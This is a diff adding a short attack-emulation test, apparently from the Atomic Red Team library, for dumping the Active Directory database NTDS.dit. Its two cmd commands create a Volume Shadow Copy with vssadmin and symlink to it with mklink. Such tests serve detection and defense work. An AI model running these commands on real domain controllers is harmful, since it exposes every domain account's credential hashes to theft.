@@ -1,0 +1,9 @@
+#TechniqueName: OS Credential Dumping: NTDS
+#AtomicTestName: Create Symlink to Volume Shadow Copy
+#Description: This test is intended to be run on a domain Controller.&&The Active Directory database NTDS.dit may be dumped by creating a symlink to Volume Shadow Copy.&
+#Language: cmd
+
+#commands
+vssadmin.exe create shadow /for=C:
+mklink /D C:\Temp\vssstore \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+
